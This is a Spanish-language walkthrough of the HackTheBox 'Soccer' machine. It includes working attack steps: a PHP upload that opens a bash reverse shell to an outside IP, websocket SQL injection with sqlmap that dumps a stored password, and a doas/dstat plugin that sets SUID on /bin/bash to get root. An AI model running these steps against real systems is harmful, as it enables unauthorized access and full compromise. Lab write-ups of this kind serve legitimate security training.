---
layout: post
author: 4akatun
---

# Writeup
![HTB](/assets/img/Soccer/soccer.png)

HACK-THE-BOX

----------------------------------------------------------------------------------------------

Iniciamo el escaneo de la maquina


```bash
❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.194

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-12 20:20 CET
Initiating SYN Stealth Scan at 20:20
Scanning 10.10.11.194 [65535 ports]
Discovered open port 80/tcp on 10.10.11.194
Discovered open port 22/tcp on 10.10.11.194
Discovered open port 9091/tcp on 10.10.11.194
Completed SYN Stealth Scan at 20:20, 13.15s elapsed (65535 total ports)
Nmap scan report for 10.10.11.194
Host is up, received user-set (0.057s latency).
Scanned at 2023-01-12 20:20:32 CET for 13s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```
Vemo que el ***puerto 80*** esta abierto, lanzamos ***whatweb*** para obtener mas informacion antes de ingresar en el navegador


```bash
 ❯ whatweb 10.10.11.194

http://10.10.11.194 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], RedirectLocation[http://soccer.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://soccer.htb/ - no address for soccer.htb


```
Vemos que nos lanza un ***ERROR*** pues nuestra maquina no tiene conocimiento de el dominio ***soccer.htb***, asi que lo introducimos en nuesto ***/etc/host***

Una vez lo tengamos ingresaremos en nuestro navegador la ***url -> http://soccer.htb*** que nos llevara al sitio web

![imagen Web](/assets/img/Soccer/web.png)

La pagina web parece ser muy estatica y no tener apesnas infomacion. Procedemos a continuacion prodecemos con la herramienta ***WFUZZ*** para buscar posibles directorios existentes.
```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt "http://soccer.htb/FUZZ"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
=====================================================================


Total time: 0
Processed Requests: 7986
Filtered Requests: 7971
Requests/sec.: 0

```
Y obtenemos resultados encontramos el direcctorio ***/tiny***.

Si continuamos con la busqueda en dicho direcctorio no encontramos con un panel de *usuario y contraseña*

![adminpanel](/assets/img/Soccer/adminpanel.png)

Haciendo una busqueda rapida por ***Goggle*** podemos dar con unas credenciales por defecto.

![credential](/assets/img/Soccer/credential.png)

Una vez probamos, vemos que las credenciales son correctas y vamos indagando mas en esta web.

Nos aparece lo siguiente...

![filemanager_Web](/assets/img/Soccer/filemanager.png)
![directorio](/assets/img/Soccer/tinydirectorio.png)
Vemos lo que parece un *gestor o adminitrador de archivos* donde si nos fijamos tiene un apartado uploads, en el que probaremos a subir nuestro *archivo php* con la esperanza de que sea factible.

Debemos de tener en cuenta que solo tenemos permisos en la carpeta ***tiny/uploads***, es alli donde se alojara nuestro archivo.

Nos creamos nuestro archivo ***php*** con carga util para poder establecer una shell reversa atraves de nuestro archivo, el comando es el siguiente:


```php
<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.33/443 0>&1'")
?>
 ```

Lo subimos...

![upload](/assets/img/Soccer/upload.png)

Una vez tenemos el archivo subido pulsamos en el para obtener la sieguiete ventana...

![shell](/assets/img/Soccer/shell.png)

A continuacion no ponemos en escucha en nuestro equipo con netcat y pulsamos ***Open*** en pagina web del archivo. Asi podremos obtener nuestra ***shell*** reversa como ***www-data*** 

 ```bash
 ❯ nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.194] 53304
bash: cannot set terminal process group (1044): Inappropriate ioctl for device
bash: no job control in this shell

www-data@soccer:~/html/tiny/uploads$ whoami
whoami
www-data

www-data@soccer:~/html/tiny/uploads$ hostname -I
hostname -I
10.10.11.194 dead:beef::250:56ff:feb9:636c 
www-data@soccer:~/html/tiny/uploads$
 ```
 Aunque como el usuario ***www-data*** no encontraremos gran cosa.
 Pero recordemos que el ***puerto 9091*** estaba abierto con el servicion ***xmlmail*** posiblemente sea un ***web socket*** y lo podremos comprobar con ***websocat***

 ```bash
 ❯ websocat ws://soccer.htb:9091 -v

[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::ws_client_peer] Connected to ws
 ```
Y efectivamente, tenemos conectividad.
Es hora de hacer una busque en ***google***, que tanto nos ayuda.
Podermos dar con el siguiente -> [link](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html), que indica como podemos hacer una sql injection al web socket redirigiendo la peticional mismo ***web socket*** con un script en python.

Usaremos el script que nos proporcia el articulo variando.

```python
ws_server = "ws://localhost:8156/ws"
# SUSTITUCION
ws_server = "ws/soccer.htb:9091/"
```

Y las siguiente linea tambien debe ser cambiada...

```python
data = '{"employeeID":"%s"}' % message
# SUSTITUCION
data = '{"id":"%s"}' % message
```
Ya esta todo listo para lanzar nuestro script de python y redirigir el flujo para poder hacer el ataque ***SQL*** que posterior mente haremos con ***sqlmap*** nos ayudara en la automatizacion del proceso.

Ejecutamos python:

 ```bash
 ❯ python3 xploit.py

[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*

 ```
Una vez ya estamos en escucha con nuestro script de python iniciamos ***sqlmap***

```bash
sqlmap --usrl="http://localhost:8081/?id=1" --batch -dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Conseguimos conocer las bases de datos existentes *(buena noticia)* asi que proseguimos a ver que con tienela base de datos ***soccer_db*** que parece ser la mas prometedora.

```bash
sqlmap --usrl="http://localhost:8081/?id=1" --batch -D soccer_db -tables

Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```
Encontramos una tabla y buscaremos que columnas contiene.

```bash
sqlmap --usrl="http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -columns

Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
```

Vamos encontrando consas interesantes, veamos que contienen los campos ***username*** y ***password***

```bash
sqlmap --usrl="http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump

Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```

Enhorabuena, tenemos un usuario -> ***player*** y un password o contraseña -> ***PlayerOftheMatch2022***.
Cosa que probraremos a continuacion, sera conectarnos por ***ssh*** con esta informacion que tenemos.

Conseguimos acceso, vemos que que usuario somos y en que equipo nos encontramos, ya podemos visualizar la primera ***flag*** y con menzar con la escalada de privilegios.
 
 ```bash
❯ ssh player@10.10.11.194
player@10.10.11.194's password: PlayerOftheMatch2022
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
```
```bash
player@soccer:~$ whoami
layer
```
```bash
player@soccer:~$ hostname -I
10.10.11.194 dead:beef::250:56ff:feb9:636c 
```
```bash 
player@soccer:~$ cat user.txt 
2b****************************de
 ```

Buscamos archivos binarios ***SUID*** que podamos explotar de alguna manera.

```bash
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
player@soccer:~$ 
```

Y encontramos la ruta del archivo binario *doas* ***/usr/local/bin/doas*** en esa misma ruta en ***/usr/local/etc/*** encontramos ***doas.conf***, pero no tenemos permisos
```bash
player@soccer:/usr/local/bin$ ls -la
-rwsr-xr-x  1 root root 42224 Nov 17 09:09 doas
-rwxr-xr-x  1 root root  2002 Nov 17 09:09 doasedit
-rwxr-xr-x  1 root root  5471 Nov 17 09:09 vidoas
```
```bash
player@soccer:/usr/local/etc$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```
```bash
player@soccer:/usr/local/etc$ ls -la
-rw-r--r--  1 root root   48 Nov 17 09:10 doas.conf
```
Aqui nos dice que podemos ejecutar ***dstat*** como ***root*** sin proporcionar contraseña.
Procedemos a la ejecucion.
```bash
player@soccer:/usr/local/etc$ doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
  1   1  99   0   0|  55k   19k|   0     0 |   0     0 | 272   566 
  0   0  99   0   0|   0     0 | 242B  790B|   0     0 | 277   485 
  1   0  99   0   0|   0     0 |  66B  342B|   0     0 | 261   482
```
```bash
player@soccer:/usr/local/etc$ ls -la /usr/local/share/dstat/
total 8
drwxrwx--- 2 root player 4096 Dec 12 14:53 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
```
Miramos la ruta ***/usr/local/share/dstat y tenemos capacidad de escritura, el propietario es *root* pero *player* pertenece al grupo y tiene la capacidad de ejecutar, leer y escribir.

Asi que simplemente nos hacemos un script en *python* que otorgue privilegio *SUID* a */bin/bash* y acceder como ***root***
```bash
player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
```
Ejecutamos doas con privilegios de ***root***

```bash
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
```
Vemos que ***/bin/bash*** tiene los permisos ***SUID***
```bash
player@soccer:/usr/local/share/dstat$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Ejecutamos los comando y ya temos acceso como ***root*** y podemos ver la ***flag***
```bash
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
69****************************ab
bash-5.0# 
```

# Espro que te pueda servir de ayuda. *GRACIAS por venir*


